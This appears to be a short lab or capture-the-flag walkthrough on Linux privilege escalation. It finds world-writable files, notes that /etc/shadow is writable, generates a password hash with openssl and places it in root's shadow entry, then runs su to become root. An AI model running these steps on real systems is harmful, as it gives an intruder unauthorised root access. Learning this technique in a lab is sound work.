# 3⃣ Permissions

### Search for world writable files

```
find / -not -type l -perm -o+w 2>/dev/null
```

{% hint style="info" %}
We found that `/etc/shadow` is world writable.
{% endhint %}

```
ls -l /etc/shadow
```

### Generate a hash for password "password"

```
openssl passwd -1 -salt abc password
```

{% hint style="info" %}
Add the hash in the root entry in shadow file
{% endhint %}

### Escalate to root

```
su

<enter the new password>
```

